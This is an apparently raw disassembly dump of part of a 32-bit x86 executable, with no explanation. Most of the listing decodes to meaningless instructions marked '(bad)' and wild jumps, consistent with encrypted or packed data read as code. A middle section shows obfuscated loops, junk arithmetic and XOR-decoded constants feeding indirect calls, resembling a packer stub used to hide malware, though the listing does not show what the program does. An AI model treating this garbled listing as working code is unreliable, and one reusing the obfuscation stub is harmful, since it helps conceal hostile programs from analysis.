  40b1b0:	xlat   BYTE PTR ds:[ebx]
  40b1b1:	ja     0x40b1bf
  40b1b3:	or     bh,0x1b
  40b1b6:	jle    0x40b18e
  40b1b8:	nop
  40b1b9:	inc    edi
  40b1ba:	xor    bh,bh
  40b1bc:	jne    0x40b1b0
  40b1be:	repz or eax,0x672fdb17
  40b1c4:	sub    BYTE PTR [edi-0x56],ch
  40b1c7:	mov    ecx,0xbd634c65
  40b1cc:	loope  0x40b1b6
  40b1ce:	push   0xffffffc4
  40b1d0:	gs std 
  40b1d2:	and    edi,ebx
  40b1d4:	mov    DWORD PTR ds:0x8a3108a4,esi
  40b1da:	or     al,BYTE PTR [edx+0x2a]
  40b1dd:	pop    eax
  40b1de:	mov    ?,ebp
  40b1e0:	sub    edx,DWORD PTR [edi]
  40b1e2:	mov    ds:0xedb36775,eax
  40b1e7:	fisubr DWORD PTR [ebp+0x47]
  40b1ea:	mov    ebx,cs
  40b1ec:	leave  
  40b1ed:	push   DWORD PTR [edi+0x12a86a88]
  40b1f3:	ins    DWORD PTR es:[edi],dx
  40b1f4:	push   esp
  40b1f5:	pop    es
  40b1f6:	retf   0x55ff
  40b1f9:	ror    DWORD PTR [edi+ebp*8],0xc6
  40b1fd:	mov    DWORD PTR [edi],edx
  40b1ff:	in     al,dx
  40b200:	out    dx,eax
  40b201:	out    0xcf,al
  40b203:	xor    edx,DWORD PTR [esi+0x16]
  40b206:	mov    al,0x2c
  40b208:	mov    ah,0xca
  40b20a:	(bad)  
  40b20b:	sub    eax,0xb17a750
  40b210:	cld    
  40b211:	jmp    0x365fc7ba
  40b216:	add    eax,0x758efeb9
  40b21b:	leave  
  40b21c:	and    al,BYTE PTR [ebp-0x49602d0]
  40b222:	out    dx,eax
  40b223:	jmp    0xf2d915b8
  40b228:	repz add al,0xe7
  40b22b:	nop
  40b22c:	lahf   
  40b22d:	mov    al,ds:0xcbb11689
  40b232:	push   edx
  40b233:	sbb    eax,0xc298a1d3
  40b238:	cmc    
  40b239:	sbb    ebx,edi
  40b23b:	adc    ebp,edi
  40b23d:	out    0xee,al
  40b23f:	arpl   WORD PTR [esi-0x41],bp
  40b242:	inc    ebx
  40b243:	xchg   ebx,eax
  40b245:	xchg   ecx,eax
  40b246:	pop    edi
  40b247:	aad    0xa0
  40b249:	ins    BYTE PTR es:[edi],dx
  40b24a:	repz adc al,0x98
  40b24d:	and    dl,BYTE PTR [edi+0x441d1059]
  40b253:	jno    0x40b206
  40b255:	fiadd  DWORD PTR [ebp-0xe862071]
  40b25b:	neg    BYTE PTR [ecx]
  40b25d:	dec    esi
  40b25e:	fstp   st(4)
  40b260:	mov    esp,DWORD PTR [esi-0x4]
  40b263:	pop    ebx
  40b264:	mov    dh,0xa2
  40b266:	(bad)  
  40b268:	or     BYTE PTR [eax+0x1d2fef02],bl
  40b26e:	les    ecx,FWORD PTR [edi-0x2af4f13b]
  40b274:	xor    al,0x68
  40b276:	loop   0x40b1fd
  40b278:	xchg   esp,eax
  40b279:	aam    0xc3
  40b27b:	lods   al,BYTE PTR ds:[esi]
  40b27c:	cmp    DWORD PTR [ebp+0x34],edx
  40b27f:	mov    dh,0x2f
  40b281:	adc    ebp,esp
  40b283:	dec    esp
  40b284:	push   edx
  40b285:	push   es
  40b286:	sti    
  40b287:	int3   
  40b288:	aaa    
  40b289:	fnstenv ds:0x27f5229e
  40b28f:	pop    ds
  40b290:	sbb    bh,BYTE PTR [eax]
  40b292:	mov    ss,WORD PTR [edx-0x40]
  40b295:	jae    0x40b21b
  40b297:	push   ds
  40b298:	mov    bh,0x6e
  40b29a:	out    0x4d,al
  40b29c:	jnp    0x40b28e
  40b29e:	dec    esp
  40b29f:	in     eax,0x21
  40b2a1:	mov    bl,0xe6
  40b2a3:	adc    eax,0x1bdd31ad
  40b2a8:	xor    cl,BYTE PTR [ebp+ecx*2+0x493584ac]
  40b2af:	loop   0x40b26d
  40b2b1:	xor    DWORD PTR [edx],eax
  40b2b3:	sahf   
  40b2b4:	js     0x40b25a
  40b2b6:	xor    BYTE PTR [eax+0x64],bl
  40b2b9:	call   0xc875:0x554d4c54
  40b2c0:	jo     0x40b2e1
  40b2c2:	push   0x67
  40b2c4:	lock mov ah,0xe8
  40b2c7:	push   ebx
  40b2c8:	pusha  
  40b2c9:	xchg   ecx,edx
  40b2cb:	dec    ecx
  40b2cc:	scas   eax,DWORD PTR es:[edi]
  40b2cd:	sub    DWORD PTR [ecx],0xfc56c0e1
  40b2d3:	pop    ds
  40b2d4:	clc    
  40b2d5:	imul   esp,DWORD PTR [esi+ebx*8+0x21],0xda1efc9a
  40b2dd:	addr16 or al,0x46
  40b2e0:	jp     0x40b313
  40b2e2:	ds sub al,0x48
  40b2e5:	sub    al,0x40
  40b2e7:	shl    BYTE PTR [eax+0x2d2d17ad],cl
  40b2ed:	mov    eax,0x38d5b54a
  40b2f2:	stos   DWORD PTR es:[edi],eax
  40b2f3:	outs   dx,BYTE PTR ds:[esi]
  40b2f4:	push   edx
  40b2f5:	push   ss
  40b2f6:	sti    
  40b2f7:	ficom  DWORD PTR [esi-0x7e]
  40b2fa:	xchg   DWORD PTR [eax+0x1a7e01f0],edi
  40b300:	scas   al,BYTE PTR es:[edi]
  40b301:	lods   al,BYTE PTR ds:[esi]
  40b302:	mov    ds:0xd522125,al
  40b307:	js     0x40b355
  40b309:	dec    esp
  40b30a:	adc    bh,ah
  40b30c:	mov    al,ds:0x6120a280
  40b311:	js     0x40b2b8
  40b313:	cwde   
  40b314:	mov    ds:0xaee0d8e5,al
  40b319:	sub    BYTE PTR [edi+0x52],0x3c
  40b31d:	jle    0x40b2ed
  40b31f:	enter  0xdf63,0xbf
  40b323:	nop
  40b324:	lock dec ebp
  40b326:	add    eax,0xf87c4782
  40b32b:	adc    eax,0x675cfd1d
  40b330:	out    dx,al
  40b331:	adc    DWORD PTR [edx+0x46],ecx
  40b334:	cmp    DWORD PTR [edx-0x79],ecx
  40b337:	mov    dh,0x95
  40b339:	adc    DWORD PTR [ebx+0x48],edi
  40b33c:	and    eax,DWORD PTR [edx]
  40b33e:	ds pushf 
  40b340:	inc    eax
  40b341:	dec    esp
  40b342:	or     bl,BYTE PTR [ebp+0x2c55e155]
  40b348:	sbb    DWORD PTR [edx-0x14ab0a01],esi
  40b34e:	repnz fadd DWORD PTR [edx]
  40b351:	add    BYTE PTR [eax],al
  40b353:	repz xchg edi,eax
  40b355:	std    
  40b356:	xchg   cl,al
  40b358:	mov    cl,0x12
  40b35a:	repz pop esi
  40b35c:	retf   
  40b35d:	push   esi
  40b35e:	sahf   
  40b35f:	test   eax,0x2634054a
  40b364:	aam    0xe4
  40b366:	jle    0x40b3e5
  40b368:	push   esp
  40b369:	jmp    0x40b316
  40b36b:	inc    edi
  40b36c:	jnp    0x40b38c
  40b36e:	push   edi
  40b36f:	les    esi,FWORD PTR ds:0xbaee37bd
  40b375:	mov    bh,0xd6
  40b377:	clc    
  40b378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b379:	imul   edi,DWORD PTR [edx-0xd4b863d],0x917ea232
  40b383:	ret    0xb40a
  40b386:	shl    al,1
  40b388:	imul   ecx,ecx,0xb062c3e9
  40b38e:	xchg   esp,eax
  40b38f:	dec    DWORD PTR [ecx]
  40b391:	ror    ebp,cl
  40b393:	and    dl,BYTE PTR [ecx]
  40b395:	push   es
  40b396:	popa   
  40b397:	mov    dh,0x98
  40b399:	out    0x69,al
  40b39b:	lahf   
  40b39c:	push   eax
  40b39d:	push   edx
  40b39e:	popa   
  40b39f:	addr16 xchg edx,eax
  40b3a1:	cwde   
  40b3a2:	xchg   ecx,eax
  40b3a3:	mov    edi,0xca05aa82
  40b3a8:	jecxz  0x40b3dd
  40b3aa:	jecxz  0x40b416
  40b3ac:	mov    edx,ebx
  40b3ae:	rol    DWORD PTR [edi-0x3e],0xc1
  40b3b2:	pop    ebp
  40b3b3:	sbb    esp,DWORD PTR [esi]
  40b3b5:	or     eax,0x18edbac3
  40b3ba:	ror    BYTE PTR [eax+ebx*2-0x68047fcc],cl
  40b3c1:	ss inc ebx
  40b3c3:	inc    edx
  40b3c4:	fisttp WORD PTR [edx+0x724372af]
  40b3ca:	sub    al,0x57
  40b3cc:	test   eax,0x3f502f3c
  40b3d1:	fsin   
  40b3d3:	mov    edx,DWORD PTR [ecx-0x64]
  40b3d6:	pop    ss
  40b3d7:	scas   eax,DWORD PTR es:[edi]
  40b3d8:	push   edx
  40b3d9:	dec    ebp
  40b3da:	dec    eax
  40b3db:	xor    bh,BYTE PTR [edx+0x6e]
  40b3de:	fmul   st,st(3)
  40b3e0:	mov    dl,0xec
  40b3e2:	(bad)  
  40b3e3:	out    0x4e,al
  40b3e5:	loop   0x40b428
  40b3e7:	ss retf 
  40b3e9:	pop    esi
  40b3ea:	out    dx,al
  40b3eb:	xor    esp,DWORD PTR [ebx]
  40b3ed:	retf   0xbd68
  40b3f0:	mov    ds:0x457b8524,al
  40b3f5:	sub    bh,BYTE PTR [ecx]
  40b3f7:	xchg   edx,eax
  40b3f8:	jp     0x40b3c7
  40b3fa:	jp     0x40b3fe
  40b3fc:	and    al,0x7d
  40b3fe:	xchg   ebx,eax
  40b3ff:	cwde   
  40b400:	jae    0x40b447
  40b402:	test   DWORD PTR [ebx+0x4f9ccbbc],ecx
  40b408:	pop    edi
  40b409:	fwait
  40b40a:	jle    0x40b3bb
  40b40c:	das    
  40b40d:	sti    
  40b40e:	call   esp
  40b410:	les    eax,FWORD PTR [edi+0x3f]
  40b413:	fucomp st(0)
  40b415:	xor    al,0x67
  40b417:	int    0x8a
  40b419:	jo     0x40b3fe
  40b41b:	scas   al,BYTE PTR es:[edi]
  40b41c:	shl    eax,1
  40b41e:	add    eax,0x3a89cf41
  40b423:	push   ebx
  40b424:	mov    ebx,ss
  40b426:	sub    dh,BYTE PTR [eax+ebp*4]
  40b429:	pop    edi
  40b42a:	aad    0x6b
  40b42c:	pop    es
  40b42d:	xor    eax,0x20941405
  40b432:	xchg   ebp,eax
  40b433:	out    dx,eax
  40b434:	into   
  40b435:	xor    edi,esp
  40b437:	repnz stos BYTE PTR es:[edi],al
  40b439:	pop    ss
  40b43a:	adc    DWORD PTR [edi+ebp*1],0x1ad971eb
  40b441:	std    
  40b442:	ror    BYTE PTR [eax-0x39],cl
  40b445:	pop    ebx
  40b446:	sbb    esp,DWORD PTR [esi]
  40b448:	sub    esi,DWORD PTR [edi+0x71]
  40b44b:	cmp    ah,BYTE PTR [edx+0x457180ba]
  40b451:	xor    eax,0xfffffff6
  40b454:	xor    al,0x36
  40b456:	stc    
  40b457:	(bad)  
  40b458:	lock das 
  40b45a:	(bad)  
  40b45c:	stc    
  40b45d:	scas   al,BYTE PTR es:[edi]
  40b45e:	dec    ebx
  40b45f:	mov    esp,0xbe2f8c70
  40b464:	dec    edi
  40b465:	scas   al,BYTE PTR es:[edi]
  40b466:	in     al,dx
  40b467:	push   esp
  40b468:	shl    ch,0x70
  40b46b:	jmp    0x40b3f7
  40b46d:	mov    bh,ch
  40b46f:	imul   ebp,DWORD PTR [edx-0x61],0xa6be8593
  40b476:	call   0x896d:0x5d5570bf
  40b47d:	add    DWORD PTR [ebp-0x369688c],edi
  40b483:	adc    BYTE PTR [esi],bh
  40b485:	ret    
  40b486:	outs   dx,DWORD PTR ds:[esi]
  40b487:	pop    es
  40b488:	imul   ebp
  40b48a:	sub    eax,0x59c68a
  40b48f:	ss xor eax,0xc6d9658b
  40b495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b496:	xor    eax,0x31532413
  40b49b:	sub    eax,0x59947e8a
  40b4a0:	sbb    al,0x1
  40b4a2:	fidiv  WORD PTR [esi]
  40b4a4:	aad    0xff
  40b4a6:	(bad)  
  40b4a7:	ud0    ecx,esi
  40b4aa:	test   DWORD PTR [esi+0x5],ebp
  40b4ad:	iret   
  40b4ae:	sbb    eax,0x1308e5a0
  40b4b3:	xor    eax,0x42e9908
  40b4b8:	mov    ecx,0x31cf9788
  40b4bd:	or     BYTE PTR [edi+0x14],cl
  40b4c0:	lock std 
  40b4c2:	test   eax,0x5ed6fe79
  40b4c7:	pop    esi
  40b4c8:	retf   
  40b4c9:	sub    al,0x4b
  40b4cb:	push   ebp
  40b4cc:	and    BYTE PTR [ebx],0x86
  40b4cf:	adc    esp,eax
  40b4d1:	jp     0x40b4cb
  40b4d3:	clc    
  40b4d4:	dec    ebp
  40b4d5:	add    DWORD PTR [ebx+edx*1],esp
  40b4d8:	sub    DWORD PTR ds:[eax-0x269005c1],ecx
  40b4df:	dec    ecx
  40b4e0:	cmc    
  40b4e1:	adc    eax,ebx
  40b4e3:	bnd jg 0x40b4e7
  40b4e6:	inc    esi
  40b4e7:	mov    al,0x1b
  40b4e9:	int    0x6e
  40b4eb:	jmp    0x40b52c
  40b4ed:	xlat   BYTE PTR ds:[ebx]
  40b4ee:	fistp  WORD PTR [edi-0x361fb52]
  40b4f4:	in     al,dx
  40b4f5:	pop    esp
  40b4f6:	cwde   
  40b4f7:	jno    0x40b4c0
  40b4f9:	dec    ecx
  40b4fa:	pushf  
  40b4fb:	xor    al,cl
  40b4fd:	jae    0x40b527
  40b4ff:	frstor [ebx+0x40e65ca9]
  40b505:	fs es scas eax,DWORD PTR es:[edi]
  40b508:	test   eax,0xf03451d0
  40b50e:	pop    ecx
  40b50f:	push   ds
  40b510:	sahf   
  40b511:	imul   BYTE PTR [edx]
  40b513:	stc    
  40b514:	imul   esi,DWORD PTR [esi],0xdc449a04
  40b51a:	xor    BYTE PTR [edi],ah
  40b51c:	es pop ebx
  40b51e:	dec    ebx
  40b51f:	dec    edi
  40b520:	cs inc edx
  40b522:	fist   DWORD PTR [ebp-0x61]
  40b525:	mov    ah,0xb2
  40b527:	lea    esp,[ebp+ebx*8-0x11f8244e]
  40b52e:	sub    DWORD PTR [esi-0x39],0xcc7e4f57
  40b535:	retf   
  40b536:	sub    BYTE PTR [esi+0x8],0xe2
  40b53a:	cmp    dh,BYTE PTR [eax-0x2a]
  40b53d:	aad    0x43
  40b53f:	lods   al,BYTE PTR ds:[esi]
  40b540:	shl    BYTE PTR [edx+0x2e],1
  40b543:	fs in  eax,0xcf
  40b546:	call   0xc39cc242
  40b54b:	mov    edi,0x43ed0606
  40b550:	xchg   BYTE PTR [edx-0x7d],dl
  40b553:	mov    dh,0xe6
  40b555:	dec    eax
  40b556:	pop    ds
  40b557:	pop    esp
  40b558:	outs   dx,DWORD PTR ds:[esi]
  40b559:	cmp    BYTE PTR [edx-0x7fb18450],ch
  40b55f:	xor    ecx,DWORD PTR [esi-0x394e76ea]
  40b565:	enter  0x95e6,0xc4
  40b569:	sbb    al,0x98
  40b56b:	outs   dx,BYTE PTR ds:[esi]
  40b56c:	jecxz  0x40b543
  40b56e:	sbb    eax,0x32e7d387
  40b573:	dec    ebp
  40b574:	cmp    al,0x8d
  40b576:	add    esi,DWORD PTR [edi]
  40b578:	jle    0x40b5a7
  40b57a:	push   es
  40b57b:	mov    al,ds:0xb8d68156
  40b580:	sub    DWORD PTR [eax],eax
  40b582:	add    BYTE PTR [edi+0xb],dl
  40b585:	cmp    eax,0x42b010
  40b58a:	mov    esi,0x7510893
  40b58f:	or     ecx,ecx
  40b591:	xor    eax,esi
  40b593:	mov    edi,0x3272db
  40b598:	add    eax,edi
  40b59a:	sub    DWORD PTR ds:0x42a018,0x772b
  40b5a4:	mov    DWORD PTR [ebp-0x38],eax
  40b5a7:	mov    eax,ds:0x4217e2
  40b5ac:	mov    ecx,DWORD PTR ds:0x428008
  40b5b2:	and    DWORD PTR ds:0x42b004,ecx
  40b5b8:	mov    eax,DWORD PTR [eax]
  40b5ba:	mov    DWORD PTR ds:0x42a01c,0x19
  40b5c4:	cmp    DWORD PTR ds:0x42a01c,0x0
  40b5cb:	je     0x40b61b
  40b5d1:	cmp    DWORD PTR ds:0x42a01c,0x4
  40b5d8:	jne    0x40b5ef
  40b5de:	push   0x506a
  40b5e3:	push   DWORD PTR [ebp-0x24]
  40b5e6:	push   DWORD PTR [ebp-0x14]
  40b5e9:	call   DWORD PTR ds:0x424028
  40b5ef:	cmp    DWORD PTR ds:0x42a01c,0x5
  40b5f6:	jne    0x40b609
  40b5fc:	mov    ecx,DWORD PTR ds:0x42a01c
  40b602:	dec    ecx
  40b603:	mov    DWORD PTR ds:0x42a01c,ecx
  40b609:	mov    ecx,DWORD PTR ds:0x42a01c
  40b60f:	dec    ecx
  40b610:	mov    DWORD PTR ds:0x42a01c,ecx
  40b616:	jmp    0x40b5c4
  40b61b:	mov    DWORD PTR [ebp-0x24],eax
  40b61e:	add    DWORD PTR ds:0x428014,ecx
  40b624:	mov    eax,ds:0x4219ea
  40b629:	mov    ecx,DWORD PTR ds:0x42175a
  40b62f:	mov    ecx,DWORD PTR [ecx]
  40b631:	adc    DWORD PTR ds:0x42a008,ecx
  40b637:	mov    eax,DWORD PTR [eax]
  40b639:	and    DWORD PTR ds:0x42a01c,0x0
  40b643:	jmp    0x40b655
  40b648:	mov    ecx,DWORD PTR ds:0x42a01c
  40b64e:	inc    ecx
  40b64f:	mov    DWORD PTR ds:0x42a01c,ecx
  40b655:	cmp    DWORD PTR ds:0x42a01c,0x10
  40b65c:	jae    0x40b75b
  40b662:	cmp    DWORD PTR ds:0x42a01c,0x8
  40b669:	jne    0x40b67f
  40b66f:	push   0x42359e
  40b674:	push   0x42351e
  40b679:	call   DWORD PTR ds:0x424030
  40b67f:	cmp    DWORD PTR ds:0x42a01c,0x7
  40b686:	jne    0x40b69b
  40b68c:	xor    ecx,ecx
  40b68e:	xor    ecx,DWORD PTR ds:0x42a01c
  40b694:	inc    ecx
  40b695:	mov    DWORD PTR ds:0x42a01c,ecx
  40b69b:	jmp    0x40b648
  40b6a0:	and    DWORD PTR ds:0x42901c,0x0
  40b6aa:	jmp    0x40b6bc
  40b6af:	mov    ecx,DWORD PTR ds:0x42901c
  40b6b5:	inc    ecx
  40b6b6:	mov    DWORD PTR ds:0x42901c,ecx
  40b6bc:	cmp    DWORD PTR ds:0x42901c,0x11
  40b6c3:	jae    0x40b75b
  40b6c9:	cmp    DWORD PTR ds:0x42901c,0x7
  40b6d0:	jne    0x40b6f6
  40b6d6:	push   DWORD PTR [ebp-0x10]
  40b6d9:	push   DWORD PTR [ebp-0x18]
  40b6dc:	push   0x2cae
  40b6e1:	push   0x19d0
  40b6e6:	push   0x7b35
  40b6eb:	push   0x42c01c
  40b6f0:	call   DWORD PTR ds:0x424038
  40b6f6:	cmp    DWORD PTR ds:0x42901c,0x6
  40b6fd:	jne    0x40b710
  40b703:	mov    ecx,DWORD PTR ds:0x42901c
  40b709:	inc    ecx
  40b70a:	mov    DWORD PTR ds:0x42901c,ecx
  40b710:	jmp    0x40b6af
  40b715:	mov    DWORD PTR ds:0x42c00c,0x11
  40b71f:	cmp    DWORD PTR ds:0x42c00c,0x0
  40b726:	je     0x40b75b
  40b72c:	cmp    DWORD PTR ds:0x42c00c,0x18
  40b733:	jne    0x40b749
  40b739:	push   0x42a008
  40b73e:	push   0x6229
  40b743:	call   DWORD PTR ds:0x42403c
  40b749:	mov    ecx,DWORD PTR ds:0x42c00c
  40b74f:	dec    ecx
  40b750:	mov    DWORD PTR ds:0x42c00c,ecx
  40b756:	jmp    0x40b71f
  40b75b:	mov    DWORD PTR [ebp-0x28],eax
  40b75e:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  40b765:	mov    eax,DWORD PTR [ebp-0x34]
  40b768:	xor    eax,esi
  40b76a:	add    eax,edi
  40b76c:	sbb    DWORD PTR ds:0x42a000,0x3656
  40b776:	mov    DWORD PTR [ebp-0x38],eax
  40b779:	mov    eax,ds:0x421962
  40b77e:	mov    DWORD PTR [ebp-0x38],eax
  40b781:	or     eax,0x6382
  40b786:	mov    eax,DWORD PTR [ebp-0x24]
  40b789:	and    DWORD PTR ds:0x42a008,0x0
  40b793:	mov    ecx,DWORD PTR ds:0x42a008
  40b799:	inc    ecx
  40b79a:	mov    DWORD PTR ds:0x42a008,ecx
  40b7a0:	cmp    DWORD PTR ds:0x42a008,0x9
  40b7a7:	jne    0x40b7bb
  40b7ad:	push   DWORD PTR [ebp-0x14]
  40b7b0:	push   0x4234f9
  40b7b5:	call   DWORD PTR ds:0x424040
  40b7bb:	cmp    DWORD PTR ds:0x42a008,0x8
  40b7c2:	jne    0x40b7d7
  40b7c8:	xor    ecx,ecx
  40b7ca:	add    ecx,DWORD PTR ds:0x42a008
  40b7d0:	inc    ecx
  40b7d1:	mov    DWORD PTR ds:0x42a008,ecx
  40b7d7:	cmp    DWORD PTR ds:0x42a008,0x17
  40b7de:	jb     0x40b793
  40b7e4:	mov    DWORD PTR [ebp-0x14],eax
  40b7e7:	mov    eax,DWORD PTR [ebp-0x14]
  40b7ea:	dec    DWORD PTR ds:0x42c000
  40b7f0:	push   0x4
  40b7f2:	and    ecx,DWORD PTR ds:0x42a018
  40b7f8:	pop    ecx
  40b7f9:	sbb    DWORD PTR ds:0x42b000,0x429004
  40b803:	sub    ecx,eax
  40b805:	xor    DWORD PTR ds:0x42a01c,0x102e
  40b80f:	add    ecx,DWORD PTR [ebp-0x28]
  40b812:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  40b819:	adc    eax,0x5aaa
  40b81e:	mov    DWORD PTR [ebp-0x20],ecx
  40b821:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  40b82b:	and    DWORD PTR ds:0x428010,0x0
  40b835:	jmp    0x40b848
  40b83a:	xor    eax,eax
  40b83c:	add    eax,DWORD PTR ds:0x428010
  40b842:	inc    eax
  40b843:	mov    ds:0x428010,eax
  40b848:	cmp    DWORD PTR ds:0x428010,0x10
  40b84f:	jae    0x40b88a
  40b855:	cmp    DWORD PTR ds:0x428010,0x9
  40b85c:	jne    0x40b86d
  40b862:	push   0x423510
  40b867:	call   DWORD PTR ds:0x424044
  40b86d:	cmp    DWORD PTR ds:0x428010,0x8
  40b874:	jne    0x40b885
  40b87a:	mov    eax,ds:0x428010
  40b87f:	inc    eax
  40b880:	mov    ds:0x428010,eax
  40b885:	jmp    0x40b83a
  40b88a:	mov    eax,DWORD PTR [ebp-0x14]
  40b88d:	sbb    DWORD PTR ds:0x42a018,0x429014
  40b897:	mov    DWORD PTR [ebp-0x90],eax
  40b89d:	dec    eax
  40b89e:	mov    eax,DWORD PTR [ebp-0x20]
  40b8a1:	mov    DWORD PTR [ebp-0x8c],eax
  40b8a7:	add    DWORD PTR ds:0x42c00c,0x20f
  40b8b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40b8b4:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  40b8be:	xor    eax,esi
  40b8c0:	add    eax,edi
  40b8c2:	mov    DWORD PTR [ebp-0x88],eax
  40b8c8:	lea    eax,[ebp-0x50]
  40b8cb:	or     DWORD PTR ds:0x42b014,0x1a32
  40b8d5:	mov    DWORD PTR [ebp-0x84],eax
  40b8db:	mov    eax,DWORD PTR [ebp-0x94]
  40b8e1:	xor    DWORD PTR ds:0x42b010,0x42a00c
  40b8eb:	xor    eax,esi
  40b8ed:	xor    DWORD PTR ds:0x42900c,0x429018
  40b8f7:	add    eax,edi
  40b8f9:	and    DWORD PTR ds:0x428020,0x42c01c
  40b903:	mov    DWORD PTR [ebp-0x94],eax
  40b909:	and    DWORD PTR ds:0x42a000,0x429010
  40b913:	lea    eax,[ebp-0x94]
  40b919:	adc    DWORD PTR ds:0x42b018,0x42c018
  40b923:	push   eax
  40b924:	movzx  eax,WORD PTR ds:0x42b01c
  40b92b:	add    DWORD PTR ds:0x42a008,eax
  40b931:	mov    eax,DWORD PTR [ebp+0xc]
  40b934:	xor    eax,esi
  40b936:	add    DWORD PTR ds:0x428028,0x2102
  40b940:	add    eax,edi
  40b942:	sub    DWORD PTR ds:0x429010,0x36a
  40b94c:	push   eax
  40b94d:	mov    eax,ds:0x421982
  40b952:	adc    DWORD PTR ds:0x428024,0x6674
  40b95c:	push   0x4218d8
  40b961:	and    DWORD PTR ds:0x42a014,0x6ed
  40b96b:	push   DWORD PTR [eax]
  40b96d:	add    DWORD PTR ds:0x42a000,0x42900c
  40b977:	call   0x405c6f
  40b97c:	or     eax,DWORD PTR ds:0x42901c
  40b982:	mov    eax,DWORD PTR [ebp-0x14]
  40b985:	and    ecx,0x4079
  40b98b:	mov    ecx,DWORD PTR [ebp-0x20]
  40b98e:	sub    DWORD PTR ds:0x42b01c,0xab5
  40b998:	mov    DWORD PTR [ebp-0x44],ecx
  40b99b:	sbb    DWORD PTR ds:0x42b01c,edi
  40b9a1:	mov    ecx,DWORD PTR [ebp+0x8]
  40b9a4:	jmp    0x40dd19
  40b9a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9aa:	or     ah,bl
  40b9ac:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0x76186403
  40b9b7:	or     esp,edi
  40b9b9:	dec    edi
  40b9ba:	hlt    
  40b9bb:	bound  esp,QWORD PTR [edx+0xa]
  40b9be:	pop    edi
  40b9bf:	bound  esp,QWORD PTR [edx-0x2f]
  40b9c2:	push   edx
  40b9c3:	dec    esp
  40b9c4:	fucomip st,st(3)
  40b9c6:	jl     0x40ba40
  40b9c8:	lds    edx,FWORD PTR [esi+0x7b9b140]
  40b9ce:	and    dh,BYTE PTR [eax]
  40b9d0:	(bad)  
  40b9d2:	sbb    edx,esi
  40b9d4:	jl     0x40b9ff
  40b9d6:	push   0x65b2212
  40b9db:	out    0x41,eax
  40b9dd:	mov    cl,0x28
  40b9df:	jmp    0x40ba2b
  40b9e1:	sbb    BYTE PTR [ebp-0x2e],al
  40b9e4:	lds    ebx,FWORD PTR [ebp+0x49b084b5]
  40b9ea:	sahf   
  40b9eb:	add    eax,0xd82b4353
  40b9f0:	add    al,0x72
  40b9f2:	mov    bl,0x34
  40b9f4:	sub    BYTE PTR [ebx+0x56],dl
  40b9f7:	pop    ebp
  40b9f8:	mov    esi,0xf4ae4707
  40b9fd:	ja     0x40b9be
  40b9ff:	fdivr  QWORD PTR [edi-0x57]
  40ba02:	ret    
  40ba03:	and    esi,DWORD PTR [edx+0x1c]
  40ba06:	mov    eax,0x5f798dcf
  40ba0b:	jae    0x40ba42
  40ba0d:	dec    ebx
  40ba0e:	sub    eax,DWORD PTR [eax-0xd68fb3f]
  40ba14:	cmp    dl,BYTE PTR [edx-0x54]
  40ba17:	push   edi
  40ba18:	fcom   DWORD PTR [esi+edx*2]
  40ba1b:	aam    0x84
  40ba1d:	jno    0x40ba4c
  40ba1f:	cwde   
  40ba20:	push   ss
  40ba21:	lods   al,BYTE PTR ds:[esi]
  40ba22:	dec    ebx
  40ba23:	or     ebp,edi
  40ba25:	mov    WORD PTR [edx+0x17],?
  40ba28:	aaa    
  40ba29:	jae    0x40ba0e
  40ba2b:	outs   dx,DWORD PTR ds:[esi]
  40ba2c:	aad    0x7e
  40ba2e:	bndstx [ebx+ebp*8+0x35],(bad)
  40ba33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba34:	fisubr WORD PTR [edi]
  40ba36:	enter  0x23cc,0xeb
  40ba3a:	jno    0x40b9d5
  40ba3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba3d:	lock pop ds
  40ba3f:	sub    dl,BYTE PTR [ebp+0x783f1bb1]
  40ba45:	mov    bl,BYTE PTR [esi+0x1d]
  40ba48:	cmp    DWORD PTR [edi+0x5a],eax
  40ba4b:	add    ecx,esi
  40ba4d:	das    
  40ba4e:	adc    eax,0xe4fde792
  40ba53:	mov    ebp,0xbadf428f
  40ba58:	stc    
  40ba59:	(bad)  
  40ba5a:	or     dh,BYTE PTR [esi+0x5b]
  40ba5d:	fxtract 
  40ba5f:	jl     0x40baa9
  40ba61:	add    DWORD PTR [edx-0x33464591],ecx
  40ba67:	in     eax,0x3e
  40ba69:	adc    al,0x17
  40ba6b:	sub    cl,BYTE PTR [esi+0x746c027c]
  40ba71:	jns    0x40ba20
  40ba73:	js     0x40ba6d
  40ba75:	ins    BYTE PTR es:[edi],dx
  40ba76:	xlat   BYTE PTR ds:[ebx]
  40ba77:	xor    eax,0x67e4378a
  40ba7c:	and    DWORD PTR [ebp+0x7b],esp
  40ba7f:	cli    
  40ba80:	sub    ecx,esi
  40ba82:	int    0xd6
  40ba84:	retf   0xcd
  40ba87:	cli    
  40ba88:	in     al,dx
  40ba89:	popf   
  40ba8a:	jle    0x40ba39
  40ba8c:	adc    BYTE PTR [eax],al
  40ba8e:	in     al,0xe6
  40ba90:	mov    DWORD PTR [ecx+0x77],ebx
  40ba93:	mov    eax,ds:0x2234904f
  40ba98:	dec    edi
  40ba99:	adc    esi,DWORD PTR [edi-0x7f]
  40ba9c:	jns    0x40ba23
  40ba9e:	clc    
  40ba9f:	jmp    0xbef3d589
  40baa4:	(bad)  
  40baa6:	add    al,0xa0
  40baa8:	mov    ds:0xe1faa37c,al
  40baad:	inc    ebx
  40baae:	mov    al,ds:0xb8c613aa
  40bab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bab4:	xchg   BYTE PTR ds:0xaf83ff9f,dh
  40baba:	(bad)  
  40babc:	inc    ecx
  40babd:	mov    ds:0x74ba675f,al
  40bac2:	mov    bh,0x1c
  40bac4:	in     eax,0x7f
  40bac6:	jmp    0x5a1ae827
  40bacb:	add    al,0x1e
  40bacd:	xchg   edi,eax
  40bace:	sbb    bl,BYTE PTR [ecx-0x2c]
  40bad1:	jbe    0x40bad5
  40bad3:	jb     0x40baca
  40bad5:	fbstp  TBYTE PTR [edx-0x5b5b65a0]
  40badb:	jmp    0x40bae5
  40badd:	jl     0x40baa3
